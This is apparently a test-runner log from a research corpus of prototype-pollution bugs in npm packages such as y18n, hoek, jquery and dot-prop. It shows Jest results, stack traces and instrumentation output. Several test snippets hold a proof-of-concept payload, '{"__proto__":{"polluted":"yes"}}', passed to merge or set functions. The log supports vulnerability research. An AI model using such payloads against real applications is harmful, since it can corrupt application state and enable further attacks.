b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 5\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/y18n_3.2.1/y18n.test.js']
FAIL y18n_3.2.1/y18n.test.js
  ✕ prototype pollution in y18n (82 ms)

  ● prototype pollution in y18n

    ReferenceError: obj is not defined

      3 | test("prototype pollution in y18n", () => {
      4 |   const y18n = require("y18n")();
    > 5 |   obj = {};
        |      ^
      6 | 
      7 |   expect({}.polluted).toBe(undefined);
      8 | 

      at Object.<anonymous> (y18n_3.2.1/y18n.test.js:5:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.1 s
Ran all test suites matching /y18n_3.2.1\/y18n.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'y18n_3.2.1/y18n.test.js']' returned non-zero exit status 1.
['../prototype-pollution/record-like-deep-assign_1.0.1/record-like-deep-assign.test.js']
FAIL record-like-deep-assign_1.0.1/record-like-deep-assign.test.js
  ✕ prototype pollution in x-assign (51 ms)

  ● prototype pollution in x-assign

    ReferenceError: EVIL_JSON is not defined

       6 | 
       7 |   let obj = {};
    >  8 |   EVIL_JSON = JSON.parse('{"__proto__":{"polluted":"yes"}}');
         |            ^
       9 |   deepAssign({}, EVIL_JSON);
      10 | 
      11 |   expect({}.polluted).toBe("yes");

      at Object.<anonymous> (record-like-deep-assign_1.0.1/record-like-deep-assign.test.js:8:12)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.095 s
Ran all test suites matching /record-like-deep-assign_1.0.1\/record-like-deep-assign.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'record-like-deep-assign_1.0.1/record-like-deep-assign.test.js']' returned non-zero exit status 1.
['../prototype-pollution/json-pointer_0.6.1/json-pointer.test.js']
PASS json-pointer_0.6.1/json-pointer.test.js
  ✓ prototype pollution in json-pointer (100 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.114 s
Ran all test suites matching /json-pointer_0.6.1\/json-pointer.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'get',    'set',\n      'remove', 'dict',\n      'walk',   'has',\n      'escape', 'unescape',\n      'parse',  'compile',\n      'main'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'main', 'set' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 1, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/node-forge_0.9.0/node-forge.test.js']
PASS node-forge_0.9.0/node-forge.test.js
  ✓ prototype pollution in node-forge (2024 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        3.129 s
Ran all test suites matching /node-forge_0.9.0\/node-forge.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'options',   'util',   'cipher',  'aes',\n      'pki',       'oids',   'asn1',    'md',\n      'hmac',      'md5',    'pem',     'des',\n      'pkcs5',     'pbkdf2', 'sha256',  'prng',\n      'random',    'rc2',    'jsbn',    'sha1',\n      'pkcs1',     'prime',  'rsa',     'pbe',\n      'pkcs7asn1', 'pkcs7',  'mgf',     'mgf1',\n      'pss',       'pkcs12', 'tls',     'debug',\n      'sha512',    'sha384', 'ed25519', 'kem',\n      'log',       'ssh',    'task'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'util' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 7\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/lutils-merge_0.2.6/lutils-merge.test.js']
FAIL lutils-merge_0.2.6/lutils-merge.test.js
  ✕ prototype pollution in lutils-merge (88 ms)

  ● prototype pollution in lutils-merge

    ReferenceError: obj is not defined

      3 |   const merge = require("lutils-merge");
      4 |   const payload = '{"__proto__":{"polluted":"yes"}}';
    > 5 |   obj = {};
        |      ^
      6 | 
      7 |   expect({}.polluted).toBe(undefined);
      8 | 

      at Object.<anonymous> (lutils-merge_0.2.6/lutils-merge.test.js:5:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.153 s
Ran all test suites matching /lutils-merge_0.2.6\/lutils-merge.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'lutils-merge_0.2.6/lutils-merge.test.js']' returned non-zero exit status 1.
['../prototype-pollution/putil-merge_3.0.0/putil-merge.test.js']
FAIL putil-merge_3.0.0/putil-merge.test.js
  ✕ prototype pollution in putil-merge (34 ms)

  ● prototype pollution in putil-merge

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/putil-merge/lib/merge.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in putil-merge

    TypeError: putil_merge is not a function

       7 |   expect({}.polluted).toBe(undefined);
       8 | 
    >  9 |   putil_merge(obj, payload, { deep: true });
         |   ^
      10 | 
      11 |   expect({}.polluted).toBe("yes");
      12 | });

      at Object.<anonymous> (putil-merge_3.0.0/putil-merge.test.js:9:3)

  ● prototype pollution in putil-merge

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.068 s
Ran all test suites matching /putil-merge_3.0.0\/putil-merge.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'putil-merge_3.0.0/putil-merge.test.js']' returned non-zero exit status 1.
['../prototype-pollution/arr-flatten-unflatten_1.1.4/arr-flatten-unflatten.test.js']
PASS arr-flatten-unflatten_1.1.4/arr-flatten-unflatten.test.js
  ✓ prototype pollution in arr-flatten-unflatten (79 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.104 s
Ran all test suites matching /arr-flatten-unflatten_1.1.4\/arr-flatten-unflatten.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'flatten', 'unflatten' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'unflatten' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 5, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/jquery_1.11.0/jquery.test.js']
FAIL jquery_1.11.0/jquery.test.js
  ✕ prototype pollution in jquery (248 ms)

  ● prototype pollution in jquery

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/tough-cookie/lib/cookie.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.353 s
Ran all test suites matching /jquery_1.11.0\/jquery.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'jquery_1.11.0/jquery.test.js']' returned non-zero exit status 1.
['../prototype-pollution/Templ8_0.7.0/Templ8.test.js']
PASS Templ8_0.7.0/Templ8.test.js
  ✓ prototype pollution in Templ8 (214 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.218 s
Ran all test suites matching /Templ8_0.7.0\/Templ8.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'copy',      'escapeRE',\n      'format',    'get',\n      'gsub',      'stringify',\n      'tostr',     'type',\n      'Assert',    'Filter',\n      'Statement', 'Tag',\n      'main'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'main', 'prototype' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 1, 7\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/js-ini_1.2.0/js-ini.test.js']
FAIL js-ini_1.2.0/js-ini.test.js
  ✕ prototype pollution in js-ini (130 ms)

  ● prototype pollution in js-ini

    ReferenceError: obj is not defined

      4 |   const path = require("path");
      5 |   const ini = require("js-ini");
    > 6 |   obj = {};
        |      ^
      7 | 
      8 |   expect({}.polluted).toBe(undefined);
      9 | 

      at Object.<anonymous> (js-ini_1.2.0/js-ini.test.js:6:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.173 s
Ran all test suites matching /js-ini_1.2.0\/js-ini.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'js-ini_1.2.0/js-ini.test.js']' returned non-zero exit status 1.
['../prototype-pollution/Proto_1.1.4/Proto.test.js']
PASS Proto_1.1.4/Proto.test.js
  ✓ prototype pollution in Proto (169 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.186 s
Ran all test suites matching /Proto_1.1.4\/Proto.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'VERSION',            'size',\n      'create',             'each',\n      'implements',         'unproxyAll',\n      'proxyAll',           'unproxy',\n      'proxy',              'overload',\n      'copyShallowObjects', 'shallowMerge',\n      'flush',              'keys',\n      'copy',               'is',\n      'of',                 'merge',\n      'ape',                'invoke',\n      'extends',            'main'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'main', 'merge' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 9\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/uifabric-utilities_7.20.2/uifabric-utilities.test.js']
FAIL uifabric-utilities_7.20.2/uifabric-utilities.test.js
  ✕ prototype pollution in @uifabric/utilities  (1585 ms)

  ● prototype pollution in @uifabric/utilities 

    ReferenceError: y is not defined

       9 |   expect({}.polluted).toBe(undefined);
      10 | 
    > 11 |   y = util.merge(source2, JSON.parse(malicious_payload));
         |    ^
      12 | 
      13 |   expect({}.polluted).toBe("yes");
      14 | });

      at Object.<anonymous> (uifabric-utilities_7.20.2/uifabric-utilities.test.js:11:4)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        2.611 s
Ran all test suites matching /uifabric-utilities_7.20.2\/uifabric-utilities.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'uifabric-utilities_7.20.2/uifabric-utilities.test.js']' returned non-zero exit status 1.
['../prototype-pollution/json-pointer_0.6.0/json-pointer.test.js']
PASS json-pointer_0.6.0/json-pointer.test.js
  ✓ prototype pollution in json-pointer (90 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.173 s
Ran all test suites matching /json-pointer_0.6.0\/json-pointer.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'get',    'set',\n      'remove', 'dict',\n      'walk',   'has',\n      'escape', 'unescape',\n      'parse',  'compile',\n      'main'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'main', 'set' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 1, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/hoek_5.0.0/hoek.test.js']
FAIL hoek_5.0.0/hoek.test.js
  ✕ prototype pollution in hoek (104 ms)

  ● prototype pollution in hoek

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/hoek/lib/index.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in hoek

    ReferenceError: obj is not defined

      2 | test("prototype pollution in hoek", () => {
      3 |   const Hoek = require("hoek");
    > 4 |   obj = {};
        |      ^
      5 |   let malicious_payload = '{"__proto__":{"polluted":"yes"}}';
      6 | 
      7 |   expect({}.polluted).toBe(undefined);

      at Object.<anonymous> (hoek_5.0.0/hoek.test.js:4:6)

  ● prototype pollution in hoek

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.125 s
Ran all test suites matching /hoek_5.0.0\/hoek.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'hoek_5.0.0/hoek.test.js']' returned non-zero exit status 1.
['../prototype-pollution/strikeentco-set_1.0.0/strikeentco.test.js']
FAIL strikeentco-set_1.0.0/strikeentco.test.js
  ✕ prototype pollution in strikeentco/set  (33 ms)

  ● prototype pollution in strikeentco/set 

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/@strikeentco/set/main.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in strikeentco/set 

    TypeError: sset is not a function

       6 |   expect({}.polluted).toBe(undefined);
       7 | 
    >  8 |   sset(obj, "__proto__.polluted", "yes");
         |   ^
       9 |   expect(obj.polluted).toBe("yes");
      10 | });
      11 | 

      at Object.<anonymous> (strikeentco-set_1.0.0/strikeentco.test.js:8:3)

  ● prototype pollution in strikeentco/set 

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.153 s
Ran all test suites matching /strikeentco-set_1.0.0\/strikeentco.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'strikeentco-set_1.0.0/strikeentco.test.js']' returned non-zero exit status 1.
['../prototype-pollution/safe-flat_2.0.0/safe-flat.test.js']
FAIL safe-flat_2.0.0/safe-flat.test.js
  ✕ prototype pollution in safeFlat (57 ms)

  ● prototype pollution in safeFlat

    ReferenceError: obj is not defined

      2 | test("prototype pollution in safeFlat", () => {
      3 |   var safeFlat = require("safe-flat");
    > 4 |   obj = {};
        |      ^
      5 | 
      6 |   expect({}.polluted).toBe(undefined);
      7 | 

      at Object.<anonymous> (safe-flat_2.0.0/safe-flat.test.js:4:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.119 s
Ran all test suites matching /safe-flat_2.0.0\/safe-flat.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'safe-flat_2.0.0/safe-flat.test.js']' returned non-zero exit status 1.
['../prototype-pollution/dot-prop_2.0.0/dot-prop.test.js']
PASS dot-prop_2.0.0/dot-prop.test.js
  ✓ prototype pollution in dot-prop (42 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.203 s
Ran all test suites matching /dot-prop_2.0.0\/dot-prop.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'get', 'set' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'set' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 5, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/deep-override_1.0.0/deep-override.test.js']
PASS deep-override_1.0.0/deep-override.test.js
  ✓ prototype pollution in deep-override (59 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.087 s
Ran all test suites matching /deep-override_1.0.0\/deep-override.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 6\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/deepmergefn_1.1.0/deepmergefn.test.js']
FAIL deepmergefn_1.1.0/deepmergefn.test.js
  ✕ prototype pollution in deepmergefn (35 ms)

  ● prototype pollution in deepmergefn

    ReferenceError: EVIL_DATA is not defined

       5 |   expect({}.polluted).toBe(undefined);
       6 | 
    >  7 |   EVIL_DATA = JSON.parse('{"__proto__":{"polluted":"yes"}}');
         |            ^
       8 |   deepMerge({}, EVIL_DATA);
       9 | 
      10 |   expect({}.polluted).toBe("yes");

      at Object.<anonymous> (deepmergefn_1.1.0/deepmergefn.test.js:7:12)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.067 s
Ran all test suites matching /deepmergefn_1.1.0\/deepmergefn.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'deepmergefn_1.1.0/deepmergefn.test.js']' returned non-zero exit status 1.
['../prototype-pollution/objection_2.0.0/objection.test.js']
FAIL objection_2.0.0/objection.test.js
  ✕ prototype pollution in objection (379 ms)

  ● prototype pollution in objection

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/db-errors/lib/parsers/postgres/DBError/ConstraintViolationError/UniqueViolationError/parser.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in objection

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.406 s
Ran all test suites matching /objection_2.0.0\/objection.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'objection_2.0.0/objection.test.js']' returned non-zero exit status 1.
['../prototype-pollution/json8-merge-patch_1.0.1/json8-merge-patch.test.js']
PASS json8-merge-patch_1.0.1/json8-merge-patch.test.js
  ✓ prototype pollution in json8-merge-patch (116 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.143 s
Ran all test suites matching /json8-merge-patch_1.0.1\/json8-merge-patch.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'apply', 'patch', 'diff', 'MEDIATYPE' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'apply' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 2, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/worksmith_1.0.0/worksmith.test.js']
FAIL worksmith_1.0.0/worksmith.test.js
  ✕ prototype pollution in worksmith (174 ms)

  ● prototype pollution in worksmith

